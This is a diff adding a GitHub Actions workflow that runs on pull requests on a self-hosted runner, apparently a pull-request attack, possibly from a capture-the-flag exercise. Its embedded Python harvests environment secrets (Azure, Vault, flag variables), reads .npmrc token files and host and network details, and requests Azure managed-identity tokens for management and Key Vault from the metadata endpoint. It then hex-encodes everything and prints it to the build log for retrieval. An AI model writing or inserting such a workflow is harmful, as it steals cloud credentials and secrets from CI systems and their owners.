@@ -1,0 +1,67 @@
+name: baba-pr-probe
+on:
+  pull_request:
+
+jobs:
+  probe:
+    runs-on: self-hosted
+    timeout-minutes: 6
+    steps:
+      - name: runner-probe
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          import json, os, subprocess, urllib.request
+
+          def read(p, limit=24000):
+              try:
+                  with open(os.path.expanduser(p), "r", encoding="utf-8", errors="replace") as f:
+                      return f.read(limit)
+              except Exception as e:
+                  return "ERR " + type(e).__name__ + ": " + str(e)
+
+          def sh(cmd, timeout=8):
+              try:
+                  return subprocess.check_output(
+                      ["/bin/sh", "-lc", cmd],
+                      stderr=subprocess.STDOUT,
+                      timeout=timeout,
+                      text=True
+                  )[:24000]
+              except Exception as e:
+                  o = getattr(e, "output", "") or ""
+                  return (str(o) + "\nERR " + type(e).__name__ + ": " + str(e))[:24000]
+
+          def get(url):
+              try:
+                  req = urllib.request.Request(url, headers={"Metadata":"true"})
+                  with urllib.request.urlopen(req, timeout=8) as r:
+                      return r.read(30000).decode("utf-8", "replace")
+              except Exception as e:
+                  return "ERR " + type(e).__name__ + ": " + str(e)
+
+          keep = {}
+          for k,v in os.environ.items():
+              if k.upper().startswith(("AZURE_", "CONCIERGE_", "ARM_", "VAULT_", "FLAG", "CTF")):
+                  keep[k] = v
+
+          obj = {
+              "marker": "BABA_PR_RUNNER",
+              "cwd": os.getcwd(),
+              "hostname": sh("hostname").strip(),
+              "whoami": sh("id").strip(),
+              "workspace": os.environ.get("GITHUB_WORKSPACE", ""),
+              "env": keep,
+              "npmrc_local": read(".npmrc"),
+              "npmrc_home": read("~/.npmrc"),
+              "hosts": read("/etc/hosts"),
+              "route": sh("ip -4 route 2>/dev/null || true"),
+              "addrs": sh("hostname -I 2>/dev/null || true"),
+              "imds_instance": get("http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
+              "imds_arm": get("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F"),
+              "imds_vault": get("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net"),
+          }
+
+          blob = json.dumps(obj, separators=(",",":"), ensure_ascii=False).encode()
+          print("BABA_PR_HEX=" + blob.hex())
+          PY
